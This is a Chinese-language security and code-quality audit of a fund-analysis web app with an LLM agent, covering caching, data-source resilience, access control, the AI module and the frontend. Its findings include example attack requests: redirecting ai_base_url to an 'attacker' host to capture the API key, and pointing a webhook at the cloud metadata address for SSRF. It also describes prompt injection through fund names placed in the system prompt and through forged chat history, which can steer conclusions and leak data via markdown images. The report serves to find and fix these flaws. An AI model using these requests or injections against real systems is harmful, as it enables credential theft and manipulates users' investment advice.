- **MACD 因子的文档与实现不符**：`factor_engine.py:404` 说"金叉+放量→+1.0"，实现只判 `dif>dea` 与 `hist_delta>0`（`:426-435`），`volume_history` 全项目无人使用。
- **同一统计两种分位定义**：`index_valuation_service.py:69` 用严格 `<`，`market_regime_service.py:197` 用 `<=`，同一指数在两条路径上可能给出不同"高低估"分区。
- **`size_stability` 量纲不一致**：`akshare_adapter.py:834` 取的是深交所 `基金份额`（份），而 `factor_engine.py:494-499` 按"2亿~50亿（元）"判断，且数据仅对 `159xxx` 代码可得。该因子当前未启用（只读查库确认不在 active 列表），一旦从界面重新启用即生效。建议改成 `份额 × 净值` 或直接用库里的 `fund_size`（元），并与 `quality_filter` 的规模口径统一。
- **`/api/analysis/summary` 的市场概况缓存可能被全 None 毒化**：`routers/analysis.py:246-256` 无条件写 `cache_data`（允许各字段为 None），而读路径 `:217-230` 不校验 TTL/内容；`market_service` 在 120s 失败冷却期内会返回 None（`:145-146`），`clear_cache()` 又不清理 `_fail_cache`（`:92-96` 对比 `:118-125`）。结果是一次限流刷新就把空的市场概况写进 `fund_data_caches`，仪表盘在下次成功刷新前一直显示空。建议：全 None 时跳过写缓存、读路径加 TTL、`clear_cache()` 一并清失败冷却。
- **阶段涨幅缓存被部分成功覆盖**：`fund_cache_service.py:88-118` 用"全部代码"构造 `data`（缺失填 None），只要有**任意一只**成功（`hit_codes` 非空）就整份写回 → 1/60 成功的刷新会让其余 59 只的 1M/3M/6M/1Y 变成空。同处的注释只考虑了"全部失败"（已处理），漏了部分成功这一半。建议按 code 合并：新值为空则保留旧值。

---

## 4. 安全与访问控制

### [P0] 全局零鉴权：101 个端点任何人均可读写，且会回显推送密钥

- 证据：`backend/routers/*.py` 的全部端点依赖都是 `Depends(get_db)`（84-101 处，无任何 `Security(...)`/`HTTPBearer`/`Header(...)` 鉴权）；`backend/main.py:177-198` 只挂 CORS，没有认证中间件；`docker-compose.yml:44-45` 直接发布 `8000:8000`（绕过 nginx），`frontend/nginx.conf:6-9` 监听 80 且无 `auth_basic`；`main.py:177-182` 保留默认 `/docs`、`/openapi.json`。
- 额外后果（密钥回显）：`GET /api/push-channels` 把飞书 webhook 与签名密钥原文返回——`routers/push_channel.py:31-45` 的 `PushChannelOut(... webhook_url=ch.webhook_url, token=ch.token ...)`，字段定义见 `schemas/push_channel.py:35-36`。对照 `GET /api/system` 是**正确**地不回传 `ai_api_key` 的（`schemas/system_config.py:29-37`），说明这是遗漏而非设计。
- 影响：能访问到端口的人可以 `DELETE /api/funds/{id}`、`PUT /api/positions/import-csv?mode=replace`、`DELETE /api/system/error-logs`，也能读写 AI 配置。项目文档（`docs/AI_AGENT_PLAN.md`）记载"不引入鉴权"是既定决策，因此这里只强调**未覆盖的后果**（下一条）。
- 建议：最低成本是 nginx 层 `auth_basic` 或仅监听内网/加反代鉴权；若坚持无鉴权，至少给 `/api/system`（写）与 `/api/ai/*` 加共享密钥头。

### [P0] `ai_base_url` 未校验即可写入 → 真实 API Key 可被转发到任意主机

- 证据：`backend/routers/system_config.py:86-87` 对 `body.ai_base_url` 原样落库；该值直接进 SDK：`backend/ai/agent_runner.py:121-124` → `backend/llm/deepseek_provider.py:24-29` `AsyncOpenAI(api_key=..., base_url=...)`。项目**已有** SSRF 校验器 `backend/services/connectivity_service.py:44-74`（要求 https、解析后拒绝私网/链路本地/保留段），但只在连通性探测里调用（`connectivity_service.py:124`）。
- 影响：`PUT /api/system {ai_base_url:"http://attacker/v1"}` + 触发任一 AI 调用 → SDK 会带 `Authorization: Bearer <真实 Key>` 请求攻击者主机。同时它也是一个通用 SSRF 原语。
- 建议：写入口复用 `_validate_public_url`，或把 `ai_base_url` 白名单化为 4 个预设值；对 `PUT /api/system` 加鉴权。

### [P1] 推送 Webhook 的 SSRF：写入与发送两侧都没有校验

- 证据：项目**有**校验器 `services/connectivity_service.py:44` `_validate_public_url()`，但只用于连通性探测（`:124`）与调休同步（`holiday_sync_service.py:96,100`）。推送路径全程无校验：`routers/push_channel.py:129` `pusher = FeishuPush(webhook_url=ch.webhook_url or "", secret=ch.token)` → `push/feishu.py:245-250` `await client.post(self.webhook_url, ...)`；而 `webhook_url` 由 `POST/PUT /api/push-channels` 直接接受（`schemas/push_channel.py:14,24`），无鉴权。
- 影响：无鉴权调用方可以 `webhook_url=http://169.254.169.254/...` 或任何内网地址，让服务端从容器内发起请求（云元数据、内网服务探测、按错误/耗时侧信道扫描）。`README.md:466` 宣称"连通性测试含 SSRF 防护（内网地址校验）"，容易被误读为整体已防护。
- 建议：创建/更新时校验 `webhook_url`，并在**每次发送前**重新解析校验（防 DNS rebinding，可复用调休同步的逐跳思路）；推送目标限定 `open.feishu.cn` 之类白名单；给写接口加鉴权。

### [P2] CORS：`allow_credentials=True` 与运营者可配的 origins 组合

- 证据：`main.py:185-191` `allow_origins=settings.CORS_ORIGINS, allow_credentials=True, allow_methods=["*"], allow_headers=["*"]`；`config.py:52-58` 只做 `.strip()`，不校验 scheme、不拒绝 `*`。当前 `.env` 是合理的 localhost 列表（已核对，无通配符），风险在"为图省事改成 `*`"的场景。
- 影响：在无鉴权的前提下，一旦 `FUND_QUANT_CORS_ORIGINS=*`，任意网站都能从用户浏览器里驱动整套 API（含改配置、删数据）。
- 建议：启用凭据时拒绝 `*`（或改 `allow_credentials=False`），启动时用 `urlsplit` 校验每个 origin 的 scheme+host。

### [P2] 容器与部署面的加固项

- 后端镜像以 root 运行、`gcc/g++/libffi-dev` 留在最终层、未用多阶段构建（`backend/Dockerfile:12-52`）。
- 基础镜像 `python:3.9-slim` 已过 Python 3.9 生命周期终点（仅安全修复阶段结束）；本地开发环境同样是 3.9.9，意味着跨版本语法/性能改进都用不上。建议排期升到 3.12（重点检查 `zoneinfo`/`asyncio.Lock` 懒加载等已按 3.9 特殊处理的位置，`concurrency.py:55-65`、`akshare_adapter.py:127-149`）。
- nginx 只有静态资源缓存头，缺 `X-Content-Type-Options` / `X-Frame-Options` / `Referrer-Policy` / CSP（`frontend/nginx.conf:71` 是全文件唯一的 `add_header`）。
- 确认无凭据入库：`.env` 未被 git 跟踪（`.gitignore:6`），`GET /api/system` 不回传 `ai_api_key`（`schemas/system_config.py:29-37`），AI 模块无任何日志打印 Key（全量 grep 无命中）。但**工作区里那份 `.env` 含两个真实凭据**（飞书 webhook 81 字符、TuShare token 56 字符，均为注释形式残留）——git 历史干净（156 个 revision 扫描 + blob 扫描无命中），风险在于整个项目文件夹被压缩/分享时把它们一起带走。建议轮换这两个凭据并从 `.env` 删除。

---

## 5. 数据源与可靠性

这一层的设计意图（不限连重试、指数退避、随机 UA、NID/Referer 注入、按源熔断、负缓存、抖动休眠）**是刻意且正确的**，下列问题都是"某个分支没继承这套纪律"。

### [P1·最高优先级] 场外净值用未复权单位净值，分红/拆分被当成真实下跌

- 证据：`akshare_adapter.py:480-486` 解析出 `LJJZ: 累计净值` 但从未使用；`akshare_adapter.py:557` `fund_data.close_history = df["单位净值"]...`；策略 1（pingzhongdata）只构造 单位净值（`:515-521`）；对照 ETF 路径用 `adjust="qfq"`（`:325`）。
- 影响：所有基于净值的因子（动量、波动率倒数、收益风险比、回撤修复度、信息比率）在**分红除权日**会出现虚假负收益；一次**份额拆分**（单位净值腰斩）能在 60/252 日窗口内制造几倍量级的假信号。且 ETF→场外降级切换时只留一行 WARNING，口径变化在结论里不可追溯。
- 建议（低成本高收益）：用数据里已存在的 `日增长率`（`JZZZL`/`equityReturn`，基金公司已做复权）累乘出复权净值序列，或直接由 `LJJZ` 差分；在 `FundData` 上增加 `nav_basis` 字段并透传到结果 DTO，降级时记录口径。

### [P1] 一家基金取数失败 → 整个数据源对全池降级 5 分钟

- 证据：`data_source_manager.py:157-161` `except Exception: src.mark_degraded(); continue`；`mark_degraded` 置 `active=False` + 5 分钟冷却（`:44-48`、`:25`）；manager 实例被整批共享（`analysis_service.py:108`，并发在 `:219/:355`）。而"该基金无数据"与"数据源挂了"共用同一异常（`akshare_adapter.py:569` `RuntimeError("场外净值双策略失败")`）。
- 影响：池里只要有一只退市/代码错的基金，AKShare 就对全池（含第二轮取数）停摆 300s；无 JoinQuant 备源时整批失败。
- 建议：区分 `NoData` 与传输类故障；传输类需连续 N 次才熔断；熔断粒度按接口（基金/指数/实时）而非按源。

### [P1] 熔断被 `get_market_indices` / `get_bond_yield` 绕过

- 证据：`data_source_manager.py:171,178-179,190-191` 判断的是 `src.adapter.available`，而 `BaseDataSource.available` 默认恒 `True`（`base.py:63-72`），`AKShareAdapter` **没有覆写 `available`**（只覆写了 `probe()`，`akshare_adapter.py:150-170`）；对照 `get_fund_data` 用的是 `if not src.active: continue`（`:143`）。另 `mark_unavailable` 只置 `active=False` 不置 `degraded_at`（`:56-58`），使 `should_retry`（`:39-42`）立刻为真。
- 影响：被限流降级后，指数与国债收益率取数仍会持续打被封的源——正好在"最需要退避"的时刻失效。
- 建议：三条路径统一判 `src.active`；`AKShareAdapter` 覆写 `available` 反映真实状态；`mark_unavailable` 补 `degraded_at = time.time()`。

### [P1] `run_with_timeout` 超时后立即归还并发额度，防封禁预算实际不成立

- 证据：`utils/concurrency.py:152-159` `await asyncio.wait_for(loop.run_in_executor(_AKSHARE_POOL, partial), timeout=timeout)`，`finally: sem.release()`；代码自己承认孤儿线程仍在跑（`:165-169`）。线程池 16（`:47-50`），信号量 5（`:64`）。
- 影响：超时时许可被归还、新请求立刻发出，但旧请求仍在飞行并占用线程；重复超时下**同源实际并发 > 5**，"并发 5"的防封禁合同静默失效。
- 建议：许可改由 executor future 的 done-callback 释放；或按 host 记录在飞请求数并在超限时拒绝发新请求。

### [P1] 分页部分失败被当成成功返回截断序列

- 证据：`akshare_adapter.py:452-457` 失败置 `failed=True; break`；`:468` 只在"一条都没取到"时返回 None；`:477-481` 仅 INFO 日志。结构性上限 `_LSJZ_MAX_PAGES=8` × 20 = 160 行（`:402-403`），而 `period=250` 的请求拿不到 250 行。
- 影响：20 行序列被当正常数据喂给需要 `window+10` 点的因子（`factor_engine.py:315,352,378`），因子静默退化为中性；无 `data_missing` 标记、无 error_logs 埋点。
- 建议：区分「请求中途失败」与「序列本就短」，返回专门的 PartialData 信号并在质量过滤里按数据缺失处理（否决或标记，而不是中性化）。

### [P1] 盘后估值/申购状态两个高频源没有失败冷却，且每次请求都重试

- 证据：`services/index_valuation_service.py:90-99` `except Exception: return cls._cache or []`（无失败时间戳），`if rows: cls._cache = rows`（1/4 的部分结果覆盖完整缓存）；`:192-201` 同形态；被 `fund_realtime_service.py:429,432` 在**每次**实时估值请求里 await。
- 影响：上游故障时每次刷新都重跑 4 指数链（最长 100s 的 `run_with_timeout`）与全市场申购状态表，占着全局 akshare 许可；部分成功会丢掉已有完整缓存。
- 建议：加 `_FAIL_TTL` 负缓存 + `log_source_failure` 埋点；部分结果与旧缓存合并而非覆盖；刷新移到调度器。

### [P1] JoinQuant 适配器在 async 协程里跑同步网络调用，阻塞事件循环

- 证据：`data_sources/joinquant_adapter.py:158-167` 循环内 `jq.get_price(...)`（4 次串行同步调用）、`:185-188` `jq.get_bond_yield(...)`，均在 `async def` 内且无超时；同文件 `:64-68` 自己记录了"`is_auth()` 是同步网络调用，绝不能放在 property 里…曾因此阻塞事件循环"。
- 影响：事件循环被阻塞数秒（无上界），期间 `/health` 与所有并发请求一起卡住。
- 建议：全部包 `run_with_timeout`/`asyncio.to_thread` 并给显式超时 + 埋点。

### [P1] 基准序列缓存键缺 `period`，且 `symbol` 参数被忽略

- 证据：`akshare_adapter.py:764-771` 快路径只看 TTL（`_SHARED_CACHE_TTL=3600`，`:109`）就整段返回类级缓存；写入的是 `df.tail(period + 10)`（`:789`）。`get_benchmark_series(symbol="sh000300", period=600)`（`:803-810`）全程不使用 `symbol`，抓取硬编码 `sh000300`（`:787`）。调用方 period 各不相同：分析 250、复盘 600、PK `365*5+40`（`fund_compare_service.py:176`）。
- 影响：谁先调用谁决定这一小时内所有人的基准长度——5 年 PK 可能只拿到 ~260 行基准，Beta/Alpha/IR 的窗口静默缩短；任何传其他 symbol 的调用会静默拿到沪深300。
- 建议：缓存键纳入 `(symbol, period)`，或缓存完整序列按需切片；`symbol` 要么实现要么删除。

### [P1] 调休/节假日同步功能恒失败（静默），错误还被写进了 requirements 注释

- 证据：`services/holiday_sync_service.py:104-108`
  ```python
  resp = await asyncio.to_thread(
      lambda: requests.get(url, timeout=20, allow_redirects=True, resolution_callback=_check_hop)
  )
  ```
  `requests` **没有** `resolution_callback` 参数。我在本机 `requests 2.32.5` 上直接复现：
  ```
  TypeError: request() got an unexpected keyword argument 'resolution_callback'
  ```
  每年前置的 `_validate_public_url(url)` 会正常通过，然后请求必然抛错，被 `:158-160` 的按年 `except Exception` 吞进 `errors` 列表返回。`requirements.txt:18-20` 的注释恰好是这个失效参数的"理由"："调休同步的 SSRF 逐跳校验用到 2.31+ 的 resolution_callback"——**这个理由不成立**，而它还把 `requests` 的版本下限抬到了 2.32.4。
- 运行证据（与 3.7 的估值问题同源，都是"配置/文档说做了、代码其实没做"）：本机库 `holiday_calendar` 表 **0 行**，`holiday_last_sync_at` 为空串，而 `holiday_auto_sync_enabled` 仍是 `true`（每次启动都会再试一次并再次失败）。
- 影响：① 节假日/调休数据永远同步不到，`is_a_share_trading_day_async` 只能回退 `chinese_calendar`（`trading_calendar.py:69-72`）；一旦该库的年份覆盖到期，闸门退化为"周一至周五"（`:29-33`），法定节假日会照跑分析并推送。② 设计里那段"逐跳校验防 302 到内网"的 SSRF 防护**从未执行过一次**。
- 建议：去掉不存在的参数；改用 `httpx` + 自定义 transport（拒绝私网对端）或 `allow_redirects=False` 手动逐跳校验；同步修掉 `requirements.txt` 的假注释。

### [P2] 可观测性与指纹

- `/health` 恒返回 `{"status":"ok"}`（`main.py:202-204`），数据源全挂也报健康；`DataSourceManager.source_status`（`data_source_manager.py:200-211`）**零调用方**，连 `/api/system/data-source-health` 也不含它。建议 `/health` 反映降级源，或增加 readiness 探针。
- 实时行情路径硬编码退化 UA（`fund_realtime_service.py:920,1016` `"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"`，无浏览器 token）绕过了共享 UA 池；腾讯行情走明文 `http://qt.gtimg.cn`（`:74`）且无 `raise_for_status()`（`:918-924`），403/HTML 会被解析成空批次，与"真的没有数据"无法区分。
- 10Y 国债收益率在取不到时会退化成 `沪深300股息率 + 1.5`（`akshare_adapter.py:925-930,939-946`），调用方无法区分口径；旧接口数据（文档自述 2021 年后未更新，`:880`）也没有新鲜度校验。
- 实时估值在覆盖度不足/行情缺失时**静默省略该基金**（`fund_realtime_service.py:1128-1133,1140-1145` `if growth is None: continue`），而"完全无持仓"分支是有占位与 `error` 字段的（`:1083-1090`）——同一接口两种语义。
- `concept_map_service.py:34,146,158-160` 明文 HTTP + 正则抓 HTML，无大小/编码处理、无埋点；`fund_refresh_task` 的 SQLite 锁重试会把**网络取数**一起重跑（`fund_refresh_task.py:151,170-176` → `fund_holding_service.py:42-50`），最多放大 12 次 request 打 `fundf10.eastmoney.com`，与"3-6s 反爬间隔"（`routers/fund.py:224`）矛盾。修法：取数一次入内存，只重试写库。
- `asyncio.Lock()` 在 import 期创建：`services/fund_manager_service.py:27`，与项目自己的 3.9 规矩（`routers/fund.py:47-53` "lazy：Python 3.9 避免 import 期绑定事件循环"）相悖。
- 无按 host 的请求预算：`_AKSHARE_SEM(5)`（`concurrency.py:64`）与 `_PINGZHONG_SEM(8)`（`fund_detail_service.py:44-48`）指向同一批东财域名，各自独立限流，实际并发是各管线之和。

### [P3] 交易日历语义：`is_workday` ≠ 交易日

- 证据：`data_sources/trading_calendar.py:26-33` 直接返回 `chinese_calendar.is_workday(target_date)`。实测 `chinese_calendar.is_workday(2024-02-04)`（**周日**，春节调休补班）= `True`。
- 影响：`is_trading_day` 会把调休补班的周末判成交易日；当前唯一消费者 `market_service.py:587` `get_previous_trading_days(...)` 只是多试 2 个候选（失败 `continue`），因此实际影响是**多余的交易所日报请求**，而非错误结论。`is_a_share_trading_day_async` 已先排除周末（`:55-56`），调度闸门不受影响。
- 建议：`is_trading_day` 内加 `weekday() >= 5 → False`，或改用"工作日 且 非调休补班"口径，与 `is_a_share_trading_day_async` 统一。

---

## 6. AI 模块

### [P1] Token 预算永不触发：流式请求从不索要 usage

- 证据：`backend/llm/base.py:135-145` 的 `kwargs` 里只有 `"stream": True`，**没有 `stream_options={"include_usage": True}`**（全仓 grep `stream_options` 零命中）；`agent_runner.py:204` `token_spent += (resp.prompt_tokens + resp.completion_tokens) or 1`；预算 `DEFAULT_TOKEN_BUDGET = 120_000`（`agent_runner.py:29`）在 `:226` 比较。
- 影响：OpenAI 兼容端点在流式模式下不返回 usage，两个 token 字段恒为 0 → `or 1` 让 `token_spent` 等于"轮数"（≤15）。`agent_runner.py:226-235` 的强制收敛分支是死代码，`budget_exhausted` 事件不可达，`final` 事件里的 `tokens` 字段对所有用户显示 "1"。设计文档 `docs/AI_AGENT_PLAN.md` 所依赖的"总 token 预算"护栏**不存在**。测试之所以过，是因为假 Provider 自己注入了 token 数（`tests/test_ai_agent.py:161`、`tests/test_p4_brief_skills.py:45`）。
- 建议：`astream_with_tools` 增加 `stream_options={"include_usage": True}`；去掉 `or 1`，缺失时按字符估算；每轮把序列化 prompt 长度做前置上限；补一个真实 usage 的集成断言。

### [P1] 单次请求可无上界占用资源：没有每工具超时，也没有整轮/整次超时

- 证据：`agent_runner.py:213-214` `payload = await execute_tool(...)` 裸 await；`ai_tools/registry.py:102-130` 无 `wait_for`；唯一的超时是按**事件**计的 `agent_runner.py:98` `asyncio.wait_for(agen.__anext__(), timeout=self.llm_timeout)`。设计文档承诺"单工具 20s 超时"（`docs/AI_AGENT_PLAN.md:49`）。
- 影响：Provider 每 89s 吐一个 token 就能让一轮永不结束；工具侧 `get_review_report`（`data_tools.py:385` → `review_service.py:81` `asyncio.gather`）、`get_otc_trade_status`（`data_tools.py:283` → `index_valuation_service.py:194` 45s）都会真的发网络请求。
- 建议：每个 `execute_tool` 包 20s `wait_for`，整轮与整次运行各加 wall-clock 截止时间；补并发上限。

### [P1] 无鉴权 + 无速率/并发限制 → 可烧额度、可放大数据源请求

- 证据：`routers/ai_agent.py:29` `max_rounds: Optional[int] = Field(None, ge=1, le=15)` 由客户端指定；`:53-57` 直接使用；`:30` `params` 任意 dict 流入 `presets.py:22` `FactorAuditService.audit(days=int(params.get("days", 90)))` —— **无上下限**，而同功能直连端点是有 clamp 的（`ai_agent.py:97` `max(min(days,365),15)`）。下游 `factor_audit.py:291-316` 会按 `days` 全表扫描 `analysis_results`，并对池内每只基金串行拉最长 500 天净值。
- 影响：`POST /api/ai/agent/run {"task":"factor_audit","params":{"days":100000}}` 即从无鉴权入口触发全池串行净值拉取——正是本项目限流设计要避免的放大；同时 15 轮 LLM 调用无配额、每次运行还会写约 60KB 的 `agent_events`（`:270-279`）。
- 建议：为每个预置任务建 Pydantic 参数模型并复用直连端点的 clamp；拒绝未知键；对 `/api/ai/*` 加并发信号量 + 按来源限流；服务端封顶 `max_rounds`。

### [P1] 提示词注入面：第三方文本被拼进 **system** 角色

- 证据：`agent_runner.py:150` `system = SYSTEM_PROMPT + ("\n" + extra_system)`，`:151-155` 以 `role=system` 发出；`extra_system` 来自数据源字段（`presets.py:130,65-70` 的 `f.name`/`signal_direction`）与整份报告序列化（`presets.py:20-29`）；非 Agent 路径同理（`ai_service.py:256-260` + `ai_skill_service.py:109-112,151-156`）。基金名/标签/持仓名均可被上游或用户 CSV 影响。
- 影响：一句写进"基金名称"的指令处于 system 信任级。工具全部只读（已核对无写业务表、无文件/URL 参数），因此不能升级为写库或 SSRF；现实影响是**操纵投资结论**，以及通过 markdown 图片语法形成浏览器侧外带信标（`frontend/src/pages/AiWorkbench.tsx:59` 渲染）。
- 建议：把数据派生文本一律放进独立的 `user`/`tool` 消息并加"以下为不可信数据，不得当作指令"前缀；对数据字段剥离 markdown 图片语法；给每次运行加工具调用预算作为第二道防线。

### [P1] 对话历史无归属校验

- 证据：`agent_runner.py:141-146` 按客户端传入的 `conversation_id` 直接加载最近 20 条历史，`:270-279` 追加写入；`routers/ai_chat.py:52-57` 可按 id 读取任意会话全部内容，无归属校验、无 UUID 格式校验。
- 影响：无租户边界；且可预置某 id 的 user/assistant 轮次，使**外部注入的历史**在后续运行中作为可信上下文回放（持久化提示注入）。UUID4 不可猜是唯一缓解。
- 建议：会话绑定所有者（或服务端下发的会话 cookie），校验 id 为 UUID，历史读取必须带归属 join。

### [P2] Provider 原始异常文本直接推给客户端

- 证据：`agent_runner.py:183-197` `raw = str(e)` → `msg = f"{type(e).__name__}: {raw[:300]}"` → SSE `error` 事件；前端原样弹窗（`AiWorkbench.tsx:166`）。对照同项目另一条路径的明确策略：`routers/ai_chat.py:41-43`「内部异常细节（LLM SDK 报错可能带 base_url/密钥信息）只进日志，不透给客户端」。
- 影响：Provider 响应体、request id、内部 base_url 会到达调用方；Key 格式非法时 httpx 的 `LocalProtocolError` 会把 `Bearer …` 头值带出来（`deepseek_provider.py:50` 也会记日志）。注意模型名 400 的排查体验是**故意**依赖这段原文的（`tests/test_ai_agent.py:302-307`），修改时要保留可操作性。
- 建议：把已知的 400/401/404/`model names are` 映射成固定可操作文案，原文只进日志；确需展示可用模型名时，服务端白名单化提取后返回。

### [P2] 系统提示词写死了会漂移的数字；4 个 Provider 是复制粘贴

- 证据：`agent_runner.py:34-35` 硬编码"±8.5（11 因子总权重 8.3）…≥4.0 强烈买入…"；`data_tools.py:353` `"score_clamp": 8.5`；而权重（`routers/factor.py:92`）与阈值（`routers/system_config.py:175-208`）均可被用户改，引擎钳位本身也是字面量（`scoring_engine.py:148`）。
- 影响：用户调参后，模型仍被按旧档位指导，可能引用不存在的阈值——正是设计里禁止的"编造数字"，但由提示词自身产生。
- 另：`backend/llm/{deepseek,glm,tongyi,openai}_provider.py` 四个文件除默认值与日志文案外完全相同（各约 44-53 行，`chat()` 实现逐字重复），应合并为一个 `OpenAICompatProvider`，只保留预设表。
- 建议：运行期从 `Factor`/`SystemConfig` 生成评分段，或干脆删掉该段让模型走 `get_scoring_config`/`list_factors` 工具；钳位值从评分引擎导出单一常量。

### [P2] Skill 工具描述符未做 schema 校验，且绕过预置白名单

- 证据：`ai_tools/registry.py:81-83` 在 `allowed` 过滤**之后**附加动态工具；`agent_runner.py:132-139` 载入全部启用 skill；`skill_tools.py:89-105,127-131` 把 `tool_spec` 的 `description`/`parameters` 原样塞进 OpenAI `tools` 数组（仅受 `schemas/ai.py:34` 的 5000 字符上限约束）。
- 影响：预置任务的 5 工具白名单不再是最小权限；一个畸形 `parameters` 会让整次运行 400。**已核对不存在代码执行/模板注入**：`skill_tools.py:51-56` 闭包只捕获整数 id，`:26-29` 引擎映射是硬编码字典，`:83-86` 仅按字面量 `getattr` 模块，`ai_skill_service.py:87-88` 占位符替换前转义了反斜杠。
- 建议：写入与加载时用 `jsonschema` 校验 `parameters`；预置任务增加显式 `allow_skills` 开关；把"spec 无法触达代码路径"固化为带测试的不变量。

### [P3] 其余

- 流式响应从不显式关闭（`llm/base.py:145` 无 `async with`/`aclose()`；`agent_runner.py:171-182` 超时/中断后直接 break），连接靠 GC 释放。
- `ai_agent_enabled` 灰度开关只读不写：`agent_runner.py:55` 读取，但种子（`database.py:746-790`）、`AIConfigUpdate`（`schemas/system_config.py:8-14`）、前端均无此键，只能直接改库。
- 工具结果截断信封在超限时返回 `{"ok": True, "truncated": True, "preview": "<被切断的字符串>"}`（`registry.py:118-124`），把非法 JSON 标成 `ok`；且行级截断只认顶层 list 与 `rows/items/data` 键，`get_factor_snapshot` 的"按基金代码为键的 dict"永远走字符串前缀路径（`data_tools.py:142-148`）。
- 前端在 `error` 事件后既不清空也不提交 `streamText`（`AiWorkbench.tsx:166`），而后端出错时在持久化之前就 return（`agent_runner.py:241-242` vs `:268-279`）→ 用户看到半截回答，重开会话时该问答整体消失。
- `run_batch_with_timeout` 接受 `timeout` 却从不使用（`concurrency.py:178,209`），当前无调用方（README:410 仍把它列为能力）；`_call` 的 `except (asyncio.TimeoutError, ConnectionError, ConnectionResetError, Exception)` 元组冗余，确定性错误也会重试 3 次。

---

## 7. 前端

### [P1] `QualityConfig` 保存时把无法解析的输入静默写成 0

- 证据：`frontend/src/pages/QualityConfig.tsx:128-131` `const v = parseFloat(raw); return { key, value: isNaN(v) ? 0 : v };`，随后弹绿色 toast「已保存 N 个参数」（`:135`）；输入框无上下限（`:223` `inputProps={{ step: 'any' }}`）。
- 影响：用户清空输入框、输入 `-` 或 `1,5` 都会把质量过滤参数（含 `base_buy_threshold` 这类动态阈值）写成 0，直接改变下一次分析的买卖判定，且界面告知"保存成功"。
- 建议：任一 dirty 值 `!Number.isFinite` 即拒绝保存并提示；按参数元数据做区间钳位。

### [P1] 重叠度请求写在 `setState` 更新函数里 → 重复请求 + 旧响应覆盖新选择

- 证据：`frontend/src/pages/ReviewPage.tsx:71-77`，在 `setPkSelected((prev) => {...})` 内部发 `overlapApi.get(next)`。React 18 StrictMode（`main.tsx:8`）开发期双调用 → 每次点击 2 个请求；连续点选 3 只 → 3 个无守卫请求，最终展示哪个响应取决于到达顺序，"抱团"风险表可能显示上一次选择的结果。
- 建议：`next` 在 updater 外计算；请求移入 `useEffect([pkSelected])` 并加 AbortController/请求序号。

### [P1] AI 工作台卸载时不中断 SSE 运行

- 证据：`frontend/src/pages/AiWorkbench.tsx:109,139,175,273` 只有 `onFinish` 与"停止"按钮会 abort，无卸载清理 `useEffect`（对照 `Dashboard.tsx:175-177` 有 `return () => streamControlRef.current?.abort()`）。
- 影响：运行中切走页面，reader 仍存活并持续 `setStreamText`（`:148`），服务端继续耗工具调用与 token。
- 建议：`useEffect(() => () => abortRef.current?.abort(), [])`。

### [P1] 批量回测轮询永不停止，且每次 `batchRunning` 变化都重跑一次性加载

- 证据：`frontend/src/pages/SignalBacktest.tsx:116-118` 先 `loadBatch()` 再 `if (!batchRunning) return;`；effect 依赖 `[batchRunning]`（`:131`），而该 effect 同时承担 `getConfig`/`getFeeConfig`/`loadBatch` 的一次性加载（`:102-109`）。
- 影响：什么都没跑时每 60s 仍请求 `/api/backtest/batch/results`，且每次都有 `setBatchLoading(true)` 闪一下 spinner；`batchRunning` 每次翻转都会重跑三个一次性请求。
- 建议：一次性加载拆到 `[]` effect；轮询 effect 内用 ref 判断是否在跑，或让 `status()` 自终止。

### [P2] 数据层无取消、无共享缓存：同一份基金列表被 5 处重复拉取

- 证据：`src/api/client.ts:17-21` 请求拦截器是空壳（注释写着"后续可在此处添加 token"）；全 `src/` 只有 3 处 AbortController（`api/analysis.ts:55`、`api/agent.ts:79`、`FundDetailPanel.tsx:241`），而 `fundApi.list(` 有 5 个调用点（`FundDetailPanel.tsx:571`、`Dashboard.tsx:189`、`ReviewPage.tsx:66`、`FundPool.tsx:227`、`SignalBacktest.tsx:134`）。可复现竞态：`HistoryReports.tsx:52` `useEffect(() => { loadResults(); }, [filterDate])` 无序号守卫，慢的旧日期响应会覆盖新列表。
- 建议：抽一个 `useAsyncData(fetcher, deps)`（signal + 请求 id + loading/error），并在 store 里按 `status/order` 缓存基金列表。

### [P2] 「AI 解读」结果被丢弃，提示文案指向一个看不到内容的窗口

- 证据：`ReviewPage.tsx:104-108` 与 `PositionsPage.tsx:187-191` 调用 `aiApi.chat({content, context_type:'pool'})` 时**未带 `conversation_id`**，返回值未使用，随后提示「AI 解读已生成，请到 AI 对话窗口查看」。悬浮对话组件维护自己的 `conversationId`（`AIChatWidget.tsx:37,57-65`）且没有历史加载；`aiApi.getConversations` 只被 `AiWorkbench.tsx:126` 使用。
- 影响：后端确实生成了一条新会话，但前端永远不会打开它 → 用户看到成功提示却找不到内容。
- 建议：保留返回的 `conversation_id` 并写入共享会话 store；或把解读直接内联渲染。

### [P2] 首屏关键路径包含整包 ECharts（约 341KB gzip）

- 证据：`vite.config.ts:15-19` 只做了分包，`ScoreGauge.tsx:7` 与 `FactorRadarChart.tsx:7` 仍 `import ReactECharts from 'echarts-for-react'`（全量 echarts）；`/` 重定向到 `/dashboard`（`App.tsx:254`），Dashboard 直接引用这两个图表组件。实测产物：`echarts-*.js` **1,054,667 B**、`mui-*.js` 366,018 B、`vendor-*.js` 206,861 B。
- 影响：Dashboard 渲染前需下载约 520KB gzip，而实际只用到 gauge/radar/line/bar 四种图。
- 建议：改用 `echarts/core` + 按需 `use([...])`（GaugeChart/RadarChart/LineChart/BarChart + Grid/Tooltip/Legend/DataZoom + CanvasRenderer），通过 `echarts-for-react/lib/core` 接入；图表组件再懒加载一层。

### [P2] 列表页与配置页的状态一致性问题

- `FundPool.tsx:290-347,540,550` 每行都用内联 IIFE 渲染 chips（`parseExposure`/`new Set`/哈希配色），未 memo → 勾选、星标、Snackbar 开关都会全表重算。建议抽 `React.memo` 行组件 + `useMemo`。
- `ReportConfig.tsx:95-117` 乐观更新但 `catch` 不回滚（只弹 toast），且连续切换会并发发送**整份列表**的 PUT，先发后到可能把旧顺序写回服务端。建议失败回滚/重取，并串行化或防抖保存。
- `FundPool.tsx:202`、`FactorManagement.tsx:62` 的 `_loading` 从未渲染，首屏直接显示「暂无基金数据」（`:531-532`、`HistoryReports.tsx:142-144` 同理）——把"加载中"显示成"没有数据"。建议 `loading && items.length === 0` 时渲染骨架/加载态，并抽出统一空态组件（同一段 markup 在 ≥8 个页面重复）。

### [P3] 其余

- 响应式：`Dashboard.tsx` 全部 Grid 只写 `xs`（`:343,351,…,711,792`），抽屉是 `variant="persistent"` + 固定 220px（`App.tsx:202-226`）→ 窄屏下侧栏盖住内容、3 列 KPI 与 7/5 分栏挤压表格。
